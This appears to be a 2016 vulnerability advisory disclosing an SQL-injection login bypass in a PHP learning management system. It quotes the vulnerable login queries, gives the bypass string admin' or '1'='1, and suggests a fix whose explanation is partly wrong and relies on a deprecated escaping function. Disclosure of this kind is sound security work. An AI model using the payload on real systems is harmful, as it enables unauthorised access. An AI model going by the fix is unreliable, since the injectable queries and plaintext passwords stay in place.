@@ -1,0 +1,85 @@
+# Exploit Title.............. Learning Management System Auth Bypass
+# Google Dork................ N/A
+# Date....................... 14/10/2016
+# Exploit Author............. lahilote
+# Vendor Homepage............ http://www.sourcecodester.com/php/7339/learning-management-system.html
+# Software Link.............. http://www.sourcecodester.com/sites/default/files/download/jkev/lms.zip
+# Version.................... 0.1
+# Tested on.................. xampp
+# CVE........................ N/A
+
+
+The audit_list in lms/login.php
+-------------------------------
+
+----snip----
+
+		$username = $_POST['username'];
+		$password = $_POST['password'];
+		/* student */
+			$query = "SELECT * FROM student WHERE username='$username' AND password='$password'";
+			$result = mysql_query($query)or die(mysql_error());
+			$row = mysql_fetch_array($result);
+			$num_row = mysql_num_rows($result);
+		/* teacher */
+		$query_teacher = mysql_query("SELECT * FROM teacher WHERE username='$username' AND password='$password'")or die(mysql_error());
+		$num_row_teacher = mysql_num_rows($query_teacher);
+		$row_teahcer = mysql_fetch_array($query_teacher);
+		if( $num_row > 0 ) { 
+
+----snip----
+
+lms/admin/login.php
+-------------------
+
+----snip----
+
+		$username = $_POST['username'];
+		$password = $_POST['password'];
+
+		$query = mysql_query("SELECT * FROM users WHERE username='$username' AND password='$password'")or die(mysql_error());
+		$count = mysql_num_rows($query);
+		$row = mysql_fetch_array($query);
+
+----snip----
+
+You can login with username and password: admin' or '1'='1
+
+How to fix
+----------
+One of the method's to fix and secure such Auth Bypass flaw's, is to use the php function mysql_real_escape_string.
+It causes that every of this characters \x00, \n, \r, \, '
+get's replaced with a simple Backslash „/“, so the attackers commands become useless.
+
+   Example: lms/login.php
+
+		$username = mysql_real_escape_string($_POST['username']);
+		$password = mysql_real_escape_string($_POST['password']);
+		/* student */
+			$query = "SELECT * FROM student WHERE username='$username' AND password='$password'";
+			$result = mysql_query($query)or die(mysql_error());
+			$row = mysql_fetch_array($result);
+			$num_row = mysql_num_rows($result);
+		/* teacher */
+		$query_teacher = mysql_query("SELECT * FROM teacher WHERE username='$username' AND password='$password'")or die(mysql_error());
+		$num_row_teacher = mysql_num_rows($query_teacher);
+		$row_teahcer = mysql_fetch_array($query_teacher);
+		if( $num_row > 0 ) { 
+
+   Example: lms/admin/login.php
+
+		$username = mysql_real_escape_string($_POST['username']);
+		$password = mysql_real_escape_string($_POST['password']);
+
+		$query = mysql_query("SELECT * FROM users WHERE username='$username' AND password='$password'")or die(mysql_error());
+		$count = mysql_num_rows($query);
+		$row = mysql_fetch_array($query);
+
+Credits
+-------
+This vulnerability was discovered and researched by lahilote
+
+References
+----------
+http://www.sourcecodester.com/php/7339/learning-management-system.html
+http://php.net/manual/en/function.mysql-real-escape-string.php
